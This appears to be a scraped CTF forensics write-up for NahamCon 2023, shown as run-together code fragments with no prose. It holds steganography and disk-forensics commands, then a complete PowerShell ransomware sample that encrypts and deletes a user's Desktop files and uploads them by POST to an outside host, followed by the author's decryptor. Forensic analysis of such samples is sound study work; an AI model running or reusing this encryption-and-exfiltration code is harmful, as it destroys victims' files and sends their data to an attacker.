# NahamCon 2023 Writeup

> 原文: https://www.ctfiot.com/120878.html
> ID: 120878


```
# stegoveritas のインストール
pip3 install stegoveritas
sudo stegoveritas_install_deps

# stegoveritas による解析
stegoveritas tiny-little-fibers.jpg
# These markers don't have a length attribute
nonLenMarkers = [ b'\xff\xd8', b'\xff\x01', b'\xffd0', b'\xffd1', b'\xffd2', b'\xffd3', b'\xffd4', b'\xffd5', b'\xffd6', b'\xffd7' ]

# Open up the file
with open(image.veritas.file_name,"rb") as myFile:
 steg = myFile.read()

while True:
 # Grab the current header
 hdr = steg[i:i+2]

 # if Start of Image, Temporary Private, Restart, things that don't have an associated length field
 if hdr in nonLenMarkers:
 # Just move to the next marker
 i = i + 2
 continue

 # If we've found our way to the end of the jpeg
 if hdr == b'\xff\xd9':
 #print("Made it to the end!")
 # Increment 2 so we can check the length
 i += 2
 break

 # Unpack the length field
 ln = unpack(">H",steg[i+2:i+4])[0]

 # print("Found Length: {0}".format(ln))

 # Update the index with the known length
 i = i+ln+2

 # When we hit scan data, we scan to the end of the format
 if hdr == b'\xff\xda':
 #print("Start of Scan data")
 # Find the end marker
 i += steg[i:].index(b'\xff\xd9')

 # Check for trailers
 if i != len(steg):
 print("Trailing Data Discovered... Saving")
 print(steg[i:])
 # Save it off for reference
 with open(output_file, "wb") as outFile:
 outFile.write(steg[i:])
# OVA を tar にして展開してから vhdx に変換する
mv nahamcon.ova nahamcon.tar
tar -xvf nahamcon.tar
qemu-img convert -f vmdk -O vhdx "Nahamcon\ Forensics\ Challenge-disk001.vmdk" out.vhdx
.\hayabusa-2.5.1-win-x64.exe csv-timeline -d "E:\Windows\System32\winevt\Logs" -o result.csv
function encryptFiles{
	Param(
 [Parameter(Mandatory=${true}, position=0)]
 [string] $baseDirectory
	)
	foreach($File in (Get-ChildItem $baseDirectory -Recurse -File)){
 if ($File.extension -ne ".enc"){
 $DestinationFile = $File.FullName + ".enc"
 $FileStreamReader = New-Object System.IO.FileStream($File.FullName, [System.IO.FileMode]::
Open)
 $FileStreamWriter = New-Object System.IO.FileStream($DestinationFile, [System.IO.FileMode]::
Create)
 $cipher = [System.Security.Cryptography.SymmetricAlgorithm]::
Create("AES")
 $cipher.key = [System.Text.Encoding]::
UTF8.GetBytes("7h3_k3y_70_unl0ck_4ll_7h3_f1l35!")
 $cipher.Padding = [System.Security.Cryptography.PaddingMode]::
PKCS7
 $cipher.GenerateIV()
 $FileStreamWriter.Write([System.BitConverter]::
GetBytes($cipher.IV.Length), 0, 4)
 $FileStreamWriter.Write($cipher.IV, 0, $cipher.IV.Length)
 $Transform = $cipher.CreateEncryptor()
 $CryptoStream = New-Object System.Security.Cryptography.CryptoStream($FileStreamWriter, $Transform, [System.Security.Cryptography.CryptoStreamMode]::
Write)
 $FileStreamReader.CopyTo($CryptoStream)
 $CryptoStream.FlushFinalBlock()
 $CryptoStream.Close()
 $FileStreamReader.Close()
 $FileStreamWriter.Close()
 Remove-Item -LiteralPath $File.FullName
 }
	}
}

$flag = "flag{892a8921517dcecf90685d478aedf5e2}"
$ErrorActionPreference= 'silentlycontinue'
$user = [System.Security.Principal.WindowsIdentity]::
GetCurrent().Name.Split("\")[-1]
encryptFiles("C:\Users\"+$user+"\Desktop")
Add-Type -assembly "system.io.compression.filesystem"
[io.compression.zipfile]::
CreateFromDirectory("C:\Users\"+$user+"\Desktop", "C:\Users\"+$user+"\Downloads\Desktop.zip")
$zipFileBytes = Get-Content -Path ("C:\Users\"+$user+"\Downloads\Desktop.zip") -Raw -Encoding Byte
$zipFileData = [Convert]::
ToBase64String($zipFileBytes)
$body = ConvertTo-Json -InputObject @{file=$zipFileData}
Invoke-Webrequest -Method Post -Uri "https://www.thepowershellhacker.com/exfiltration" -Body $body
Remove-Item -LiteralPath ("C:\Users\"+$user+"\Downloads\Desktop.zip")
$baseDirectory = "E:\Users\IEUser\Desktop"

foreach($File in (Get-ChildItem $baseDirectory -Recurse -File)){
 if ($File.extension -eq ".enc"){
 $SourceFile = $File.FullName
 $DestinationFile = $File.FullName.Replace(".enc","")
 $DestinationFile

 $FileStreamReader = New-Object System.IO.FileStream($SourceFile, [System.IO.FileMode]::
Open)
 $FileStreamWriter = New-Object System.IO.FileStream($DestinationFile, [System.IO.FileMode]::
Create)

 $cipher = [System.Security.Cryptography.SymmetricAlgorithm]::
Create("AES")
 $cipher.key = [System.Text.Encoding]::
UTF8.GetBytes("7h3_k3y_70_unl0ck_4ll_7h3_f1l35!")
 $cipher.Padding = [System.Security.Cryptography.PaddingMode]::
PKCS7

 $IVLengthBuffer = New-Object Byte[] 4
 $FileStreamReader.Read($IVLengthBuffer, 0, 4)

 $IVLength = [System.BitConverter]::
ToInt32($IVLengthBuffer, 0)
 $IVBuffer = New-Object Byte[] $IVLength

 $FileStreamReader.Read($IVBuffer, 0, $IVLength)
 $cipher.IV = $IVBuffer

 $Transform = $cipher.CreateDecryptor()
 $CryptoStream = New-Object System.Security.Cryptography.CryptoStream($FileStreamWriter, $Transform, [System.Security.Cryptography.CryptoStreamMode]::
Write)
 $FileStreamReader.CopyTo($CryptoStream)
 $CryptoStream.FlushFinalBlock()

 $CryptoStream.Close()
 $FileStreamReader.Close()
 $FileStreamWriter.Close()
 }
}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/img_648fae4f77396.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/img_648fae5ae902e.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/img_648fae63cd9d0.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/img_648fae6d49caf.png)